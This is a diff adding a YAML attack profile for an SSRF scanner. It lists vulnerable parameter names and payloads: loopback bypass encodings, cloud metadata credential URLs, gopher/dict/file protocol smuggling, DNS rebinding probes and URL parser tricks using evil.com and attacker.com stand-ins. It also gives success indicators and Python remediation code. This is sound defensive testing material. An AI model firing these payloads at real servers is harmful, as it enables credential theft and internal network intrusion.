@@ -1,0 +1,220 @@
+# SSRF (Server-Side Request Forgery) Attack Profile
+# Tests for SSRF vulnerabilities where an attacker tricks the server into
+# making requests to unintended internal or external resources.
+
+name: "SSRF - Server-Side Request Forgery"
+category: "request-forgery"
+severity: "critical"
+description: >
+  Tests for Server-Side Request Forgery vulnerabilities where user-supplied URLs
+  or endpoints cause the server to make unintended requests to internal services,
+  cloud metadata endpoints, or other restricted resources.
+
+# Fields commonly vulnerable to SSRF
+target_fields:
+  - "url"
+  - "endpoint"
+  - "link"
+  - "redirect"
+  - "uri"
+  - "href"
+  - "target"
+  - "dest"
+  - "destination"
+  - "fetch"
+  - "site"
+  - "host"
+  - "proxy"
+  - "callback"
+  - "webhook"
+  - "image_url"
+  - "avatar_url"
+  - "feed"
+  - "source"
+
+# Attack payloads to test
+payloads:
+  # --- Localhost / loopback access ---
+  - "http://127.0.0.1"
+  - "http://127.0.0.1:80"
+  - "http://127.0.0.1:443"
+  - "http://127.0.0.1:8080"
+  - "http://127.0.0.1:8443"
+  - "http://127.0.0.1:3000"
+  - "http://localhost"
+  - "http://localhost:8080"
+  - "http://localhost/admin"
+  - "http://localhost/server-status"
+  - "http://[::1]"
+  - "http://[::1]:8080"
+  - "http://0.0.0.0"
+  - "http://0.0.0.0:8080"
+
+  # --- Localhost bypass techniques ---
+  - "http://0x7f000001/"
+  - "http://0177.0000.0000.0001/"
+  - "http://2130706433/"
+  - "http://017700000001/"
+  - "http://127.1/"
+  - "http://127.0.1/"
+  - "http://0/"
+  - "http://0.0.0.0/"
+  - "http://①②⑦.⓪.⓪.①/"
+  - "http://127.0.0.1.nip.io/"
+  - "http://localtest.me/"
+  - "http://spoofed.burpcollaborator.net/"
+
+  # --- Cloud metadata endpoints (AWS) ---
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  - "http://169.254.169.254/latest/user-data/"
+  - "http://169.254.169.254/latest/api/token"
+  - "http://169.254.169.254/latest/dynamic/instance-identity/document"
+
+  # --- Cloud metadata endpoints (GCP) ---
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+  - "http://169.254.169.254/computeMetadata/v1/"
+
+  # --- Cloud metadata endpoints (Azure) ---
+  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
+
+  # --- Cloud metadata endpoints (DigitalOcean) ---
+  - "http://169.254.169.254/metadata/v1/"
+  - "http://169.254.169.254/metadata/v1/id"
+
+  # --- Internal network scanning ---
+  - "http://192.168.0.1"
+  - "http://192.168.1.1"
+  - "http://10.0.0.1"
+  - "http://172.16.0.1"
+  - "http://192.168.1.1:8080"
+  - "http://10.0.0.1:9200"
+  - "http://10.0.0.1:6379"
+  - "http://10.0.0.1:27017"
+
+  # --- Protocol smuggling ---
+  - "gopher://127.0.0.1:25/"
+  - "gopher://127.0.0.1:6379/_INFO"
+  - "dict://127.0.0.1:6379/INFO"
+  - "file:///etc/passwd"
+  - "file:///etc/hosts"
+  - "file:///c:/windows/system32/drivers/etc/hosts"
+  - "ftp://127.0.0.1/"
+
+  # --- DNS rebinding probes ---
+  - "http://A.]127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network/"
+  - "http://make-127-0-0-1-rr.1u.ms/"
+
+  # --- URL parser confusion ---
+  - "http://evil.com@127.0.0.1/"
+  - "http://127.0.0.1#@evil.com/"
+  - "http://127.0.0.1%2523@evil.com/"
+  - "http://127.0.0.1:80@evil.com/"
+  - "http://evil.com\\@127.0.0.1/"
+
+  # --- Redirect-based SSRF ---
+  - "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"
+  - "http://attacker.com/redirect?target=http://127.0.0.1/admin"
+
+# Indicators that suggest successful SSRF
+success_indicators:
+  response_contains:
+    # AWS metadata indicators
+    - "ami-id"
+    - "instance-id"
+    - "instance-type"
+    - "security-credentials"
+    - "iam"
+    - "AccessKeyId"
+    - "SecretAccessKey"
+    # GCP metadata indicators
+    - "computeMetadata"
+    - "service-accounts"
+    - "access_token"
+    # Azure metadata indicators
+    - "vmId"
+    - "subscriptionId"
+    # Internal service indicators
+    - "root:x:"
+    - "localhost"
+    - "127.0.0.1"
+    - "Apache Server Status"
+    - "Server at localhost"
+    - "phpinfo()"
+    # Internal service banners
+    - "Redis"
+    - "MongoDB"
+    - "Elasticsearch"
+    - "PostgreSQL"
+
+  status_codes:
+    - 200
+    - 301
+    - 302
+
+  response_time_gt: 5  # seconds (for blind SSRF time-based detection)
+
+  headers_present:
+    - "X-Cloud-Trace-Context"
+    - "X-Goog-"
+
+# How to fix this vulnerability
+remediation: |
+  🔧 How to Fix SSRF Vulnerabilities:
+
+  1. **URL Allowlisting**: Only permit requests to known, trusted domains
+     ```python
+     ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
+
+     def is_allowed(url: str) -> bool:
+         parsed = urllib.parse.urlparse(url)
+         return parsed.hostname in ALLOWED_HOSTS
+     ```
+
+  2. **Block Internal IP Ranges**: Deny requests to private/reserved IPs
+     ```python
+     import ipaddress
+
+     def is_internal(hostname: str) -> bool:
+         try:
+             ip = ipaddress.ip_address(socket.gethostbyname(hostname))
+             return ip.is_private or ip.is_loopback or ip.is_link_local
+         except (socket.gaierror, ValueError):
+             return True  # Block if resolution fails
+     ```
+
+  3. **Disable Unnecessary Protocols**: Only allow http/https
+     ```python
+     parsed = urllib.parse.urlparse(user_url)
+     if parsed.scheme not in ("http", "https"):
+         raise ValueError("Unsupported protocol")
+     ```
+
+  4. **Block Cloud Metadata Endpoints**:
+     - Use IMDSv2 (token-required) on AWS
+     - Block 169.254.169.254 at the firewall/network level
+     - Set metadata concealment on GCP
+
+  5. **Use a Request Proxy/Gateway**:
+     - Route outbound requests through a vetted proxy
+     - Apply network-level egress filtering
+
+  6. **Validate After Redirect Resolution**:
+     - Re-check the final destination URL after following redirects
+     - Limit the number of redirects followed
+
+  Additional recommendations:
+  - Implement response filtering to prevent data leakage
+  - Log and monitor all server-side outbound requests
+  - Use network segmentation to limit blast radius
+  - Set strict timeouts on outbound requests
+
+references:
+  - "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+  - "https://portswigger.net/web-security/ssrf"
+  - "https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface"
+
+cat_message: "I pounced on the wrong yarn ball! 🧶 (SSRF: server fetched an internal resource)"
